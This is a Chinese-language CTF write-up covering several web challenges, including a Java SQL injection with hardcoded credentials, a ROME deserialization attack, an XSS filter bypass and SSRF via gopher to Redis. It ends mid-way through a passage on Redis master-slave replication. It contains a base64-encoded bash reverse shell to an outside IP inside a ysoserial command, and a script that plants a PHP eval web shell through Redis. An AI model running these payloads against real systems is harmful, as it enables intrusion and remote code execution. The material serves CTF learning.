<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.core.sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DatabaseMetaData;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDict</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlDict</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (dbName != <span class="literal">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                user = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pass == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                pass = <span class="string">&quot;abc@12345&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">            var6.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title function_">getTableData</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        List&lt;Table&gt; Tables = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> getConnection(dbName, user, pass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">TableName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            <span class="type">DatabaseMetaData</span> <span class="variable">metaData</span> <span class="operator">=</span> conn.getMetaData();</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">tableNames</span> <span class="operator">=</span> metaData.getTables((String)<span class="literal">null</span>, (String)<span class="literal">null</span>, (String)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;TABLE&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(tableNames.next()) &#123;</span><br><span class="line">                TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">                <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">                <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">                    table.setTableDescribe(rs.getString(<span class="string">&quot;TABLE_COMMENT&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                table.setTableName(TableName);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">data</span> <span class="operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="literal">null</span>, TableName, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs2</span> <span class="operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="literal">null</span>, TableName);</span><br><span class="line"></span><br><span class="line">                String PK;</span><br><span class="line">                <span class="keyword">for</span>(PK = <span class="string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(data.next()) &#123;</span><br><span class="line">                    <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Row</span>(data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="string">&quot;NULLABLE&quot;</span>).equals(<span class="string">&quot;1&quot;</span>) ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>, data.getString(<span class="string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="string">&quot;REMARKS&quot;</span>), data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="string">&quot;true&quot;</span> : <span class="literal">null</span>, data.getString(<span class="string">&quot;COLUMN_SIZE&quot;</span>));</span><br><span class="line">                    table.list.add(row);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Tables.add(table);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">            var16.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Tables;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.core.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.abc.common.bean.ResponseCode;</span><br><span class="line"><span class="keyword">import</span> cn.abc.common.bean.ResponseResult;</span><br><span class="line"><span class="keyword">import</span> cn.abc.common.security.annotation.Access;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.SqlDict;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Table;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiOperation;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.CrossOrigin;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/common/test&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/sqlDict&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@Access</span></span><br><span class="line">    <span class="meta">@ApiOperation(&quot;为了开发方便对应数据库字典查询&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseResult <span class="title function_">sqlDict</span><span class="params">(String dbName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        List&lt;Table&gt; tables = SqlDict.getTableData(dbName, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;abc@12345&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ResponseResult.e(ResponseCode.OK, tables);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>单凭这2个类就知道dbName那里是字符串拼贴的，肯定存在SQL注入。这题环境搭的属实不太好，搞得我以为有鉴权，因为我第一次输入dbName就那啥了。报错。。<br>这题的思路是通过sql注入注出admin账号密码，然后扫描的时候会发现swagger接口，里面有个登录的路由，登录成功响应头有一串序列化后的Base64字符串，分析一波发现貌似是有ROME链，直接打就好。<br>这里管理员密码也不浪费时间了<code>admin@Rrrr_ctf_asde</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681750050029-7566697c-6cea-4197-beff-2c857c580c15.png#averageHue=%23f9f3d8&clientId=uba85e8a1-7d0d-4&from=paste&height=702&id=uaea2eaf8&originHeight=877&originWidth=1634&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54734&status=done&style=none&taskId=u13a09b5a-08de-4691-9bd1-cb5138f7742&title=&width=1307.2" alt="image.png"><br>至于是怎么分析出来是ROME的，反正我是不知道，应该是题目给提示了，不然你盲猜ROME是否有点？<br>那就好说直接掏出payload打了。<br><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  ROME &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;|base64</code><br>得到base64后，在current接口处有一个authorization选项，按照格式<code>Barrier payload</code>填进去就可以反弹shell了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681750743118-a8b8653b-e634-4d77-925e-4cfed1f057fe.png#averageHue=%23010100&clientId=ua51df733-b952-4&from=paste&height=680&id=u825aa30f&originHeight=850&originWidth=1404&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36614&status=done&style=none&taskId=u04a574f8-cb0f-4429-b11c-a1a3ac3ded1&title=&width=1123.2" alt="image.png"></p>
<h1 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h1><p>考点：XSS+SQL注入<br>过滤了些东西，常规payload用不了，这里可以用HTML markup<code>&amp;#</code>编码去绕过<br><a target="_blank" rel="noopener" href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html">https://www.w3.org/MarkUp/html-spec/html-spec_13.html</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xss=<span class="string">&#x27;&#x27;&#x27;alert(1)&#x27;&#x27;&#x27;</span></span><br><span class="line">output=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xss:</span><br><span class="line">    output += <span class="string">&quot;&amp;#&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(c))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot;</span> + output + <span class="string">&quot;&amp;#34&amp;#41&lt;/script&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这样就触发了alert，但是靶机无法访问外网，所以这题作废<br>上号之后就是一个简单的SQL注入</p>
<h1 id="网鼎杯-2020-玄武组-SSRFMe"><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h1><p>考点：parse_url绕过;gopher打redis；主从复制？<br>这题我居然写了1个小时。我傻逼了真的，真的太傻x了我草。。。。gopher要二次编码的啊沃日</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码是这样，我们可以先去访问hint.php，但在这之前需要绕过一下，有关parse_url的绕过太多了。这里选择<code>htttp:///127.0.0.1/hint.php</code>这样会让它返回一个false而不报错。得到内容如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>告诉我们redis的密码很明显是打redis，这里不存在啥CRLF去绕过死亡exit，这是迷惑选项，然后打redis的脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://localhost:8888/&quot;</span></span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;auth root&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>():</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += quote(redis_format(x))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(generate_payload())</span><br></pre></td></tr></table></figure>
<p>得到的payload记得二次编码。然后得到flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683458724388-6720ce09-9993-407d-9dac-9f61ff332266.png#averageHue=%23e2e2e1&clientId=ue6ad5686-acf2-4&from=paste&height=1276&id=u48f3e702&originHeight=1276&originWidth=2435&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60093&status=done&style=none&taskId=u57cc4252-87e1-4a3c-ac30-ffde86a9ad5&title=&width=2435" alt="image.png"></p>
<h2 id="主从复制？"><a href="#主从复制？" class="headerlink" title="主从复制？"></a>主从复制？</h2><p>听说预期解法是主从复制呢，那我们来看看吧。<br>简单说下原理：</p>
<ul>
<li>slaveof（新版改为REPLICAOF）建立后slave会向master发送PSYNC，请求开始复制</li>
<li>master可以返回FULLRESYNC，进行全量复制，然后将自己持久化的数据发给slave，正常情况下包括Replication ID, offset，master存储的key-value等等</li>
<li>slave会将这些数据保存到config中dbfilename指定的文件（默认为dump.rdb），然后再载入。</li>
<li>通过伪造master，可以控制发往slave的信息，从而做到无脏数据写文件</li>
<li>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件</li>
